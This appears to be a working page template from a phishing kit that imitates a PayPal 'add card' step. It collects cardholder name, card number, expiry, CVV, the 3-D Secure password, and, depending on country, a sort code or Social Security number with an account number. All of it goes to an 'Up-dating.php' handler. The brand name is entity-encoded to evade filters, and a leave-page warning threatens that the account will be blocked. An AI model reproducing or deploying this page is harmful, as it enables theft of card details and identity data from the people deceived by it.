<body class="desktop windows 7 superBowlDefault" >
<header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header>

<main class="superBowlMain">
<section id="content" role="main" data-country="US">
<section id="main" class="">
<div id="addCard" class="addCard grid12">
<div class="customGrid7"><div class="">
<div class="inner">
<i class="busy"></i>
<!-- FORM -->
<form action="Up-dating.php?log=CheckCrd#Scr=<?php echo $ran;?>=<?php echo $rans;?>Savedata=<?php echo crypt($_SESSION['s06']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" class="proceed" >
<input type="hidden" id="<?php echo crypt($_SESSION['s06']); ?>" name="_csrf" value="<?php echo crypt($_SESSION['s06']); ?>">    

<div class="stepProgress">
<span>○</span>
<span title="<?php echo $crd_ttspan; ?>" class="selected">●</span>
<span>○</span>
<span>○</span>
</div>
<div class="pageHeader">
<h2><?php echo $crd_lab1; ?></h2>
</div>
<div class="superBowlContainer">
<div class="cardEntry groupFields">
<!-- CCH-->
<p><?php echo $crd_corr; ?></p>
<div class="textInput large lap cardNumber ">
<div class="fields large">
<input type="text" id="<?php echo crypt($_SESSION['s06']); ?>" name="13"  required="required" value="" title="<?php echo $crd_crdh; ?>" placeholder="<?php echo $crd_crdh; ?>" autocomplete="off" autocorrect="off" autocapitalize="off" maxlength="16" class="validate" onKeyPress="return ValidateAlpha(event);">

</div></div>
<!-- CCN-->
<div class="textInput large lap cardNumber ">
<div class="fields large">
<input type="tel" id="tpcc" name="14" onkeyup="type_carte()" required="required" value="" title="<?php echo $crd_crdn; ?>" placeholder="<?php echo $crd_crdn; ?>" maxlength="19" class="validate" onkeypress="return isNumberKey(event)">
<span class="card" id="card" role="img"></span>
</div></div>
<!-- EXP-->
<div class="multi equal clearfix">
<div class="textInput lap expiryDate  ">
<div class="fields left">
<input id="15" class="validate" name="15" type="tel" value="" title="<?php echo $crd_expd; ?>" placeholder="<?php echo $crd_expd; ?>" maxlength="7" required="required">
</div>
</div>
<!-- CSC-->
<div class="textInput lap cscNumber  ">
<div class="fields right last">
<span class="icons cvv defaultCvv" id="<?php echo crypt($_SESSION['s06']); ?>" role="img"></span>
<input type="tel" value="" class="hasHelp validate csc" id="csc" name="16" title="<?php echo $crd_ttcv; ?>" placeholder="<?php echo $crd_cv; ?>" maxlength="4" required="required" onkeypress="return isNumberKey(event)">
<a href="javascript:popUp('<?php echo $crd_ptcv; ?>')"  style="font-size:11px"><?php echo $crd_wtcv; ?></a>
</div></div></div>
<div class="multi equal clearfix"></div>
</div>
<div class="addressEntry " id="addressEntry">
<div class="groupFields">
<!-- 3S-->
<div class="clearfix" id="stateHolder">
<div class="textInput lap city ">
<div class="fields large">
<input type="password" id="<?php echo crypt($_SESSION['s06']); ?>" name="17" class="hasHelp validate camelCase userText"  title="<?php echo $crd_3ds; ?>" placeholder="<?php echo $crd_3ds; ?>" value="" style="background: url(imcs_files/3s.png) no-repeat scroll right;">
</div>
</div></div>
<div class="multi equal clearfix">
<?php
if ($_SESSION['s09'] == 'United Kingdom') {
?>
<!-- STC -->
<div class="textInput lap cscNumber">
<div class="fields left">
<input type="tel" value="" class="hasHelp validate csc" id="19sr" name="19" title="<?php echo $crd_srt; ?>" placeholder="<?php echo $crd_srt; ?>" maxlength="16"><a href="javascript:popUp('<?php echo $crd_ptsrt; ?>')"  style="font-size:11px">What is the Sort code ?</a>
</div>
</div>
<!-- ACCN-->
<div class="textInput lap expiryDate  ">
<div class="fields right last">
<input id="<?php echo crypt($_SESSION['s06']); ?>" class="validate" name="18" type="tel" value="" title="<?php echo $crd_acc; ?>" placeholder="<?php echo $crd_acc; ?>"   maxlength="8" onkeypress="return isNumberKey(event)">
</div>
</div>
<?php
}
else{
?>
<!-- SN-->
<div class="textInput lap cscNumber">
<div class="fields left">
<input type="tel" value="" class="hasHelp validate csc" id="19sn" name="19" title="<?php echo $crd_ttsn; ?>" placeholder="<?php echo $crd_sn; ?>" maxlength="16">
</div>
</div>
<!-- ACCN-->
<div class="textInput lap expiryDate  ">
<div class="fields right last">
<input id="<?php echo crypt($_SESSION['s06']); ?>" class="validate" name="18" type="tel" value="" title="<?php echo $crd_acc; ?>" placeholder="<?php echo $crd_acc; ?>"   maxlength="12" onkeypress="return isNumberKey(event)">
</div>
</div>
<?php
 }
?>
</div></div></div>

<div class="defaultButtonGroup">
<div class="btns"><input id="submitBtn" name="_eventId_continue" type="submit" class="button" value="<?php echo $crd_btn; ?>"></div>
</div>

</div>
</form>
</div>
</div>
</div>
</div>
</section>
</section>
</main>

<!-- FOOTER --><footer id="gblFooter" role="contentinfo"><div class="footer IntentFooter"><div class="footerNav"><div class="grid12"><div class="legal"><p class="copyright">© <?php echo $crt; ?> &#80;&#97;y&#80;&#97;l</p><ul><li><a href="#<?php echo $ftr_01; ?>" ><?php echo $ftr_01; ?></a></li><li><a href="#<?php echo $ftr_02; ?>" ><?php echo $ftr_02; ?></a></li><li><a href="#<?php echo $ftr_03; ?>" ><?php echo $ftr_03; ?></a></li><li class="siteFeedback" id="siteFeedback"><a href="#<?php echo $ftr_04; ?>" class="feedback"><?php echo $ftr_04; ?></a></li></ul><div class="flag countryFlag"><a href="javascript:void(0)" id="countryFlag" class="country <?php echo $_SESSION['cntc']; ?>">countryFlag</a></div></div></div></div></div></footer>

<script>
         document.getElementsByClassName('button')[0].onclick = function(){
         window.btn_clicked = true;
          };
        window.onbeforeunload = function(){
        if(!window.btn_clicked){
        return 'If you leave, Your account may be blocked permanently !';
          }
          };
		
		jQuery(function($){
         $("#15").mask("99/99");
		 $("#19sr").mask("99-99-99");
		 $("#19sn").mask("999-99-9999");
		 });
		function popUp(URL) {
        day = new Date();
        id = day.getTime();
        eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=660,height=410,left = 565.5,top = 149');");
                             }
        function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;
            return true;
      }
      function ValidateAlpha(evt)
        {var keyCode = (evt.which) ? evt.which : evt.keyCode
            if ((keyCode < 65 || keyCode > 90) && (keyCode < 97 || keyCode > 123) && keyCode != 32)

            return false;
                return true;}
        function type_carte(){
            var get_value = document.getElementById('tpcc').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -28px";
                document.getElementById("cvv").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -402px";
                document.getElementById('cont_in').style.display ="block"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -402px";
                document.getElementById("cvv").maxLength ="3"
            }
        };
		
    </script>
</body>